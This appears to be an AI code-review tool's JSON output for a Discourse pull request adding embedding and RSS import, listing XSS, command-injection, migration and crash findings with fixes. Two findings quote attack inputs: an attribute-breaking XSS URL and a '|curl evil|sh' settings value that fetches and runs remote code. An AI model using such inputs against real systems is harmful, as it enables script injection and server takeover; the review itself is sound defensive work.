@@ -1,0 +1,159 @@
+{
+ "tool": "grapim-lean",
+ "pr_id": "discourse-graphite__4",
+ "url": "https://github.com/ai-code-review-evaluation/discourse-graphite/pull/4",
+ "head_sha": "4f8aed295a29954023b2849c060ef4fb299d1b5d",
+ "model": "claude-opus-5-5",
+ "dry": false,
+ "at": "2026-11-18T16:42:25.582Z",
+ "seconds": 96.709,
+ "status": "ok",
+ "via": "claude-cli",
+ "findings": [
+  {
+   "path": "app/models/post.rb",
+   "line": 133,
+   "end_line": 133,
+   "severity": "blocker",
+   "confidence": "medium",
+   "category": "security",
+   "title": "raw_html posts skip all sanitization, so remote or feed HTML runs as script on the forum.",
+   "body": "`cook` returns `raw` unchanged for `raw_html` posts. That raw text is HTML fetched from remote pages (Readability keeps `href`/`src`, so `javascript:` links get through) or from RSS content (`CGI.unescapeHTML` of whatever the feed contains, including `<script>`). It is then shown with `raw post.cooked` in the embed view and in normal topic views. Any later edit to such a post by its owner or by staff is also cooked as raw HTML. Whoever controls the feed or the embedded page can therefore run script in forum users' sessions. Fix: run the HTML through a whitelist sanitizer (for example `Sanitize` with a strict config that rejects `javascript:` URLs) before storing or returning it."
+  },
+  {
+   "path": "app/models/topic_embed.rb",
+   "line": 13,
+   "end_line": 13,
+   "severity": "blocker",
+   "confidence": "medium",
+   "category": "security",
+   "title": "Embed URL is put unescaped into HTML that is later shown as raw HTML (stored XSS).",
+   "body": "`url` goes straight into `<a href='#{url}'>#{url}</a>`, and the post is stored with `cook_method: raw_html`, so it is shown without sanitizing. `embed_url` comes from the public `embed/best` request. `TopicRetriever` only checks that its host equals `embeddable_host`, and `'` is a legal URI character. So `http://host/x'onmouseover='alert(1)` passes the host check. If that path returns 200 on the embedding site, the URL gets imported and the attribute breaks out into script on the Discourse origin. I could not confirm which status codes the embedding site returns for arbitrary paths. Fix: escape it, e.g. `ERB::Util.html_escape(url)`, both inside the attribute and in the link text."
+  },
+  {
+   "path": "app/jobs/scheduled/poll_feed.rb",
+   "line": 29,
+   "end_line": 29,
+   "severity": "warning",
+   "confidence": "high",
+   "category": "security",
+   "title": "Kernel#open on the feed URL setting allows command execution.",
+   "body": "`open(SiteSetting.feed_polling_url)` goes through `Kernel#open`. A value starting with `|` (for example `|curl evil|sh`) runs a shell command on the server, which gives an admin, or anyone who can change site settings, remote code execution. It also opens local files. Fix: parse the URL and allow only http/https before fetching, e.g. `URI.parse(url)` with a scheme check, then `.open` / `Net::HTTP`. `import_remote` has the same `open(url)` pattern."
+  },
+  {
+   "path": "app/models/topic_embed.rb",
+   "line": 64,
+   "end_line": 72,
+   "severity": "warning",
+   "confidence": "high",
+   "category": "correctness",
+   "title": "Protocol-relative URLs are rewritten into broken same-host paths.",
+   "body": "`href.start_with?('/')` also matches `//cdn.example.com/img.png`. The code then strips the leading slashes and prepends the site prefix, producing `http://site/cdn.example.com/img.png`. Images and links that use protocol-relative URLs, which are common in feeds, break. Fix: skip values that start with `//`."
+  },
+  {
+   "path": "lib/tasks/disqus.thor",
+   "line": 148,
+   "end_line": 148,
+   "severity": "warning",
+   "confidence": "high",
+   "category": "scope",
+   "title": "The Disqus import loses the --category option and original dates, and aborts on any unreachable link.",
+   "body": "The change removes the `--category` option and drops `created_at`, so imported topics now land uncategorized and carry the import time. People who use `-c` silently lose categorization. `import_remote` also fetches every thread link over HTTP. One 404 or network error raises out of the loop and stops the whole import partway through. The request does not ask for any of this. Fix: keep the category and `created_at` handling, and rescue fetch errors for each thread."
+  },
+  {
+   "path": "app/jobs/scheduled/poll_feed.rb",
+   "line": 35,
+   "end_line": 35,
+   "severity": "warning",
+   "confidence": "medium",
+   "category": "correctness",
+   "title": "Items without `content` crash the whole feed poll.",
+   "body": "SimpleRSS sets `content` only from `content:encoded` or Atom `<content>`. A plain RSS 2.0 item that only has `<description>` gives `i.content == nil`, so `.scrub` raises NoMethodError. That aborts the job, and no item in the feed gets imported. The job has `retry: false`, so this repeats every hour. Fix: fall back to `i.description` and skip items that have neither."
+  },
+  {
+   "path": "app/models/topic_embed.rb",
+   "line": 24,
+   "end_line": 29,
+   "severity": "warning",
+   "confidence": "medium",
+   "category": "correctness",
+   "title": "A failed post creation still reaches create! and raises, or leaves no embed.",
+   "body": "`PostCreator#create` returns the post object even when it failed to save, because it carries errors. `post.present?` is still true, so `TopicEmbed.create!` runs with `post_id: nil` and hits the NOT NULL column. The import then raises an exception instead of returning a clean failure. Fix: check `post.present? && post.persisted?`, or `creator.errors.blank?`."
+  },
+  {
+   "path": "db/migrate/20131223171005_create_top_topics.rb",
+   "line": 3,
+   "end_line": 3,
+   "severity": "warning",
+   "confidence": "medium",
+   "category": "destructive_migration",
+   "title": "An existing migration is edited to drop the table with force: true.",
+   "body": "The change adds `force: true` to an already-published `create_top_topics` migration. Any environment where this migration runs while `top_topics` already exists (for example a re-run after a partial failure) silently drops the table and its data. Editing a shipped migration is also out of scope for the embedding work. Revert this line."
+  },
+  {
+   "path": "lib/topic_retriever.rb",
+   "line": 40,
+   "end_line": 43,
+   "severity": "warning",
+   "confidence": "medium",
+   "category": "performance",
+   "title": "Every retrieval of an unknown URL re-polls and re-imports the whole feed.",
+   "body": "Each embed request for a URL that is not yet imported enqueues a job, and that job runs `Jobs::PollFeed.new.execute({})` synchronously. The throttle is per URL and staff skip it entirely. So many different embed URLs, or repeated requests by staff, each trigger a full remote feed fetch plus an import pass over every item. Consider checking only whether the URL is in the feed, or relying on the scheduled poll."
+  }
+ ],
+ "usage": {
+  "requests": 1,
+  "input": 2,
+  "cacheWrite": 22707,
+  "cacheRead": 3561,
+  "output": 6329,
+  "models": {
+   "claude-opus-5-5": 1
+  }
+ },
+ "raw": {
+  "stats": {
+   "files": 28,
+   "hunks": 36,
+   "reviewedHunks": 30,
+   "aiHunks": 0,
+   "skippedHunks": 6,
+   "inputTokens": 26270,
+   "outputTokens": 6329,
+   "model": "claude-opus-5-5",
+   "provider": "anthropic",
+   "reviewedFiles": 27,
+   "reviewedAiHunks": 0,
+   "requests": 1,
+   "droppedFindings": 0,
+   "omittedFindings": 0,
+   "comparedWith": [
+    "PR description"
+   ],
+   "noNotes": true,
+   "heldFindings": 1,
+   "passes": 1
+  },
+  "skipped": [
+   {
+    "path": "Gemfile_rails4.lock",
+    "reason": "ignored by .grapim/review.json"
+   }
+  ],
+  "deletedTests": [],
+  "notesWritten": 0,
+  "held": [
+   {
+    "path": "app/views/embed/best.html.erb",
+    "line": 6,
+    "end_line": 6,
+    "severity": "warning",
+    "confidence": "low",
+    "category": "correctness",
+    "title": "`end if` with nothing after it attaches a modifier `if` to the next template output.",
+    "body": "`<%- end if %>` compiles to `end if`, followed by the next buffer append on a later line. Ruby parses that as `end if (output...)`, which makes the whole header conditional depend on the value of the logo link output, and may emit it in an unexpected order. Use a plain `<%- end %>`."
+   }
+  ]
+ },
+ "cost_usd": 0.2408352
+}
